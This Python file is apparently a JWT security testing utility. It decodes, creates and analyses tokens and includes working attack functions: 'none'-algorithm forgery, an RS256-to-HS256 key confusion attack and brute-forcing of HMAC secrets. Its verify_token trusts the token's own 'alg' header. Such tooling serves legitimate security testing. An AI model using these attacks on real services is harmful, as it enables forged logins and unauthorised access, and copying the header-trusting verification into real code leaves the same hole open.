"""
JWT Utility functions for key generation and manipulation.
"""
import jwt
import json
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from datetime import datetime, timedelta
import logging
import hashlib
import os

logger = logging.getLogger(__name__)

class JWTUtils:
    """
    Utilities for JWT token operations including creation, verification,
    manipulation, and analysis.
    """
    
    def __init__(self):
        self.logger = logger
    
    def decode_token_parts(self, token):
        """
        Decode and parse JWT header and payload without verification.
        
        Args:
            token: JWT token string
            
        Returns:
            Dictionary with header, payload, and signature parts
        """
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return {"error": "Invalid JWT format"}
            
            header_b64 = parts[0]
            payload_b64 = parts[1]
            signature = parts[2]
            
            # Decode header and payload
            header_json = base64.b64decode(header_b64 + '=' * (-len(header_b64) % 4)).decode('utf-8')
            payload_json = base64.b64decode(payload_b64 + '=' * (-len(payload_b64) % 4)).decode('utf-8')
            
            header = json.loads(header_json)
            payload = json.loads(payload_json)
            
            return {
                "header": header,
                "payload": payload,
                "signature": signature,
                "raw_parts": parts
            }
        except Exception as e:
            self.logger.error(f"Error decoding token: {str(e)}")
            return {"error": f"Error decoding token: {str(e)}"}
    
    def verify_token(self, token, key, algorithms=None):
        """
        Verify a JWT token.
        
        Args:
            token: JWT token string
            key: Key for verification (secret for HMAC, public key for asymmetric)
            algorithms: List of allowed algorithms
            
        Returns:
            Dictionary with verification result and payload if successful
        """
        if not algorithms:
            # Try to determine algorithm from token header
            try:
                header = self.decode_token_parts(token)["header"]
                algorithms = [header.get("alg")]
            except:
                algorithms = ["HS256"]  # Default
        
        try:
            payload = jwt.decode(token, key, algorithms=algorithms)
            return {
                "valid": True,
                "payload": payload
            }
        except jwt.ExpiredSignatureError:
            return {
                "valid": False,
                "error": "Token has expired"
            }
        except jwt.InvalidTokenError as e:
            return {
                "valid": False,
                "error": f"Invalid token: {str(e)}"
            }
    
    def create_token(self, payload, key, algorithm="HS256", headers=None):
        """
        Create a new JWT token.
        
        Args:
            payload: Token payload (claims)
            key: Signing key (secret for HMAC, private key for asymmetric)
            algorithm: Signing algorithm
            headers: Additional headers
            
        Returns:
            Signed JWT token
        """
        try:
            token = jwt.encode(payload, key, algorithm=algorithm, headers=headers)
            return token
        except Exception as e:
            self.logger.error(f"Error creating token: {str(e)}")
            raise
    
    def modify_token_payload(self, token, new_payload, key=None, algorithm=None):
        """
        Modify a token's payload and optionally re-sign it.
        
        Args:
            token: Original JWT token
            new_payload: New payload to use
            key: Key for signing (if None, token will be unsigned)
            algorithm: Algorithm to use (if None, use the original algorithm)
            
        Returns:
            Modified JWT token
        """
        try:
            # Decode token parts
            parts = self.decode_token_parts(token)
            if "error" in parts:
                return {"error": parts["error"]}
            
            header = parts["header"]
            
            # Determine algorithm
            if algorithm:
                header["alg"] = algorithm
            elif not key:
                header["alg"] = "none"
            
            # Create new token
            if header["alg"].lower() == "none":
                # Create unsigned token
                header_b64 = base64.b64encode(json.dumps(header).encode()).decode('utf-8').rstrip('=')
                payload_b64 = base64.b64encode(json.dumps(new_payload).encode()).decode('utf-8').rstrip('=')
                return f"{header_b64}.{payload_b64}."
            else:
                # Create signed token
                return self.create_token(new_payload, key, algorithm=header["alg"], headers=header)
                
        except Exception as e:
            self.logger.error(f"Error modifying token: {str(e)}")
            return {"error": f"Error modifying token: {str(e)}"}
    
    def analyze_vulnerabilities(self, token):
        """
        Analyze a JWT token for common vulnerabilities and misconfigurations.
        
        Args:
            token: JWT token string
            
        Returns:
            Dictionary with vulnerability analysis
        """
        vulnerabilities = []
        token_info = self.decode_token_parts(token)
        
        if "error" in token_info:
            return {"error": token_info["error"]}
        
        header = token_info["header"]
        payload = token_info["payload"]
        
        # Check for algorithm vulnerabilities
        if header.get("alg") == "none":
            vulnerabilities.append({
                "severity": "critical",
                "issue": "None Algorithm",
                "description": "The token uses 'none' algorithm which means signature verification is bypassed.",
                "remediation": "Validate that your JWT library rejects tokens with 'none' algorithm."
            })
        
        if header.get("alg", "").startswith("HS"):
            vulnerabilities.append({
                "severity": "medium",
                "issue": "HMAC Algorithm",
                "description": "The token uses HMAC which might be vulnerable to brute force if a weak secret is used.",
                "remediation": "Use a strong secret (at least 256 bits) and consider asymmetric algorithms."
            })
            
        # Check for algorithm confusion potential
        if header.get("alg") == "RS256":
            vulnerabilities.append({
                "severity": "medium",
                "issue": "Potential Algorithm Confusion",
                "description": "RS256 tokens may be vulnerable to algorithm confusion if the backend doesn't validate algorithms correctly.",
                "remediation": "Ensure the backend explicitly checks the algorithm before verification."
            })
            
        # Check for missing or weak expiration
        if "exp" not in payload:
            vulnerabilities.append({
                "severity": "high",
                "issue": "No Expiration",
                "description": "The token does not have an expiration time (exp claim).",
                "remediation": "Always include an expiration time in your tokens."
            })
            
        # Check current time against expiration
        if "exp" in payload:
            exp_time = datetime.fromtimestamp(payload["exp"])
            if exp_time < datetime.now():
                vulnerabilities.append({
                    "severity": "info",
                    "issue": "Expired Token",
                    "description": f"Token expired on {exp_time.isoformat()}",
                    "remediation": "Generate a new token."
                })
            elif exp_time > datetime.now() + timedelta(days=30):
                vulnerabilities.append({
                    "severity": "low",
                    "issue": "Long Expiration",
                    "description": "Token has a very long expiration time (>30 days).",
                    "remediation": "Use shorter expiration times and refresh tokens."
                })
                
        # Check for missing critical claims
        for claim, severity in [
            ("iss", "medium"),  # Issuer
            ("aud", "medium"),  # Audience
            ("iat", "low"),     # Issued At
            ("jti", "low"),     # JWT ID
        ]:
            if claim not in payload:
                vulnerabilities.append({
                    "severity": severity,
                    "issue": f"Missing {claim} Claim",
                    "description": f"Token does not include the {claim} claim.",
                    "remediation": f"Include the {claim} claim in your tokens."
                })
                
        # Check for weak key ID
        if "kid" in header and header["kid"] in ["1", "key1", "default"]:
            vulnerabilities.append({
                "severity": "low",
                "issue": "Weak Key ID",
                "description": "Token uses a generic or predictable key ID.",
                "remediation": "Use unique, unpredictable key IDs."
            })
            
        # Create risk score based on vulnerability severities
        severity_weights = {
            "critical": 10,
            "high": 7,
            "medium": 4,
            "low": 2,
            "info": 1
        }
        
        risk_score = sum(severity_weights.get(v["severity"], 0) for v in vulnerabilities)
        
        # Generate recommendations
        recommendations = [
            "Use RS256 instead of HS256 for better security",
            "Always include expiration time (exp) in tokens",
            "Validate issuer and audience claims",
            "Use a strong secret key or private key",
            "Implement proper key rotation practices"
        ]
        
        return {
            "token_info": {
                "header": header,
                "payload": payload
            },
            "vulnerabilities": vulnerabilities,
            "risk_score": risk_score,
            "max_score": 10 * len(vulnerabilities),  # Maximum possible score if all were critical
            "recommendations": recommendations
        }
    
    def attempt_key_confusion(self, token, public_key):
        """
        Attempt a key confusion attack (RS256 to HS256).
        
        Args:
            token: Original RS256 token
            public_key: RSA public key in PEM format
            
        Returns:
            Dictionary with attack result
        """
        try:
            # Decode token parts
            parts = self.decode_token_parts(token)
            if "error" in parts:
                return {"error": parts["error"]}
            
            header = parts["header"]
            payload = parts["payload"]
            
            # Verify that the original token uses RS256
            if header.get("alg") != "RS256":
                return {
                    "success": False,
                    "error": "This attack only works on RS256 tokens",
                    "original_algorithm": header.get("alg")
                }
            
            # Change the algorithm to HS256
            modified_header = header.copy()
            modified_header["alg"] = "HS256"
            
            # Create a new token with HS256 using the public key as the HMAC secret
            modified_token = self.create_token(payload, public_key, algorithm="HS256", headers=modified_header)
            
            return {
                "success": True,
                "modified_token": modified_token,
                "attack_type": "Algorithm Confusion (RS256 to HS256)",
                "description": "This attack exploits implementations that don't validate the algorithm type correctly."
            }
        except Exception as e:
            self.logger.error(f"Error in algorithm confusion attack: {str(e)}")
            return {"error": f"Error in algorithm confusion attack: {str(e)}"}
    
    def attempt_token_forgery(self, token, key_candidates):
        """
        Attempt to forge a token by trying multiple keys.
        
        Args:
            token: JWT token to forge
            key_candidates: List of potential keys to try
            
        Returns:
            Dictionary with attack result
        """
        parts = self.decode_token_parts(token)
        if "error" in parts:
            return {"error": parts["error"]}
        
        header = parts["header"]
        payload = parts["payload"]
        algorithm = header.get("alg")
        
        if not algorithm.startswith("HS"):
            return {
                "success": False,
                "error": "This attack only works on HMAC-signed tokens (HS256, HS384, HS512)"
            }
        
        # Try each key
        for i, key in enumerate(key_candidates):
            try:
                # Verify with this key
                result = self.verify_token(token, key, algorithms=[algorithm])
                if result.get("valid"):
                    return {
                        "success": True,
                        "key_found": key,
                        "key_index": i,
                        "message": "Secret found! Token can be forged."
                    }
            except Exception:
                continue
        
        return {
            "success": False,
            "message": "Secret not found in provided key candidates",
            "keys_checked": len(key_candidates)
        }

def initialize_jwt_utils():
    """Initialize and return a JWTUtils instance"""
    return JWTUtils()

def generate_rsa_key_pair():
    """
    Generate an RSA key pair for JWT signing.
    Returns (private_key_pem, public_key_pem)
    """
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    
    # Get private key in PEM format
    private_key_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    ).decode('utf-8')
    
    # Get public key in PEM format
    public_key_pem = private_key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    ).decode('utf-8')
    
    return private_key_pem, public_key_pem

def create_sample_token(algorithm='HS256', key=None, expiration_days=1):
    """
    Create a sample JWT token for testing.
    
    Args:
        algorithm: The algorithm to use (HS256, RS256, etc.)
        key: The key to use for signing (secret for HS*, private key for RS*)
        expiration_days: Number of days until the token expires
        
    Returns:
        The JWT token string
    """
    # Default key if none provided
    if key is None:
        if algorithm.startswith('HS'):
            key = 'your-256-bit-secret'
        elif algorithm.startswith('RS'):
            # Generate a key pair
            private_key_pem, _ = generate_rsa_key_pair()
            key = private_key_pem
    
    # Create a payload with standard claims
    payload = {
        'sub': '1234567890',
        'name': 'John Doe',
        'role': 'user',
        'iat': datetime.utcnow(),
        'exp': datetime.utcnow() + timedelta(days=expiration_days)
    }
    
    # Ensure key is not None before encoding
    if key is None:
        raise ValueError("Signing key cannot be None")
        
    # Create and return the token
    return jwt.encode(payload, key, algorithm=algorithm)

def create_token_pair():
    """
    Create a pair of tokens: one with HS256 and one with RS256,
    useful for algorithm confusion testing.
    
    Returns:
        (hs256_token, rs256_token, secret, private_key_pem, public_key_pem)
    """
    # Generate an RSA key pair
    private_key_pem, public_key_pem = generate_rsa_key_pair()
    
    # Create a secret for HS256
    secret = 'your-256-bit-secret'
    
    # Create payload with standard claims
    payload = {
        'sub': '1234567890',
        'name': 'John Doe',
        'role': 'user',
        'iat': datetime.utcnow(),
        'exp': datetime.utcnow() + timedelta(days=1)
    }
    
    # Create tokens
    hs256_token = jwt.encode(payload, secret, algorithm='HS256')
    rs256_token = jwt.encode(payload, private_key_pem, algorithm='RS256')
    
    return hs256_token, rs256_token, secret, private_key_pem, public_key_pem 